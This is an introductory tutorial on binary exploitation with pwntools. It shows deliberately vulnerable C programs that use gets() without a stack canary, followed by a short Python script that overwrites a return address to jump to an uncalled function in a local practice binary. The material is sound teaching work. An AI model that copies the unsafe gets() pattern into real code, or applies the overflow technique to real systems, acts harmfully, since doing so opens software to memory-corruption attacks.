# SuperSimplePwn, an introduction to pwntools and binary exploitation

Here's a simple C program:
```c
#include <stdio.h>

int main()
{
	int myVar = 1337;
	char myCharVar[10];
	gets(myCharVar);
	if(myVar==1337){
		printf("good job\n");
	}
	else{
		printf("bad job\n");
	}
}
```
It doesn't do much, there's not going to be any vulnerabilities, right?  
![image](https://user-images.githubusercontent.com/65077960/127715019-788df58f-1be6-4eda-bb33-ff1430802a90.png)  

Even in a simple script, there are plenty of flaws and potential exploits that we can use. For example, the absence of canary means the program fails to validate the intergrity of the stack.  
![image](https://user-images.githubusercontent.com/65077960/127715140-96cbd4f6-025b-4490-88cc-c62946dae6ba.png)

If we give it input bigger than the buffer size, we can access the 2nd output by overwriting our current memory address. The "gets" function is considered dangerous, saving input to a buffer, even if it surpasses it's limits.
This is known as [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow). But who cares, right? we're just accessing it locally and accessing output that we typically can't.

Well, let's take a look at this program:  
```c
#include <stdio.h>

int canttouchthis(){
	printf("You shouldn't be here\n");
}

int main()
{       
	int myVar = 1337;
	char myCharVar[10];
	gets(myCharVar);
	printf("good job\n");
}
```

Again, we can cause a segmentation fault:  
![image](https://user-images.githubusercontent.com/65077960/127716435-5fc36553-62bf-4141-a04b-3e2a0c9dab79.png)

But the interesting part, the flag, is out of our scope. How do exploit it? We'll need to start by performing some recon. I'll use radare2 but you can use any debugger. We need the address of the "canttouchthis" function, so we can overwrite the "ret" instruction at the end of main().  

![image](https://user-images.githubusercontent.com/65077960/127717983-9c0d9f4e-fe64-4765-a89c-9f886e8de39b.png)

We'll make a small python script to exploit this:
```py
from pwn import *

p = process("./pwnme")
# Use a pattern to verify changes after overflow, p64 after as it's little endian.
buf = b"aaaaaaaabbbbbbbbcccccc" + p64(<addr>)
# overwriting the return address with the "canttouchthis" function address
p.sendline(buf)
print(p.recvline())
print(p.recvline())
```
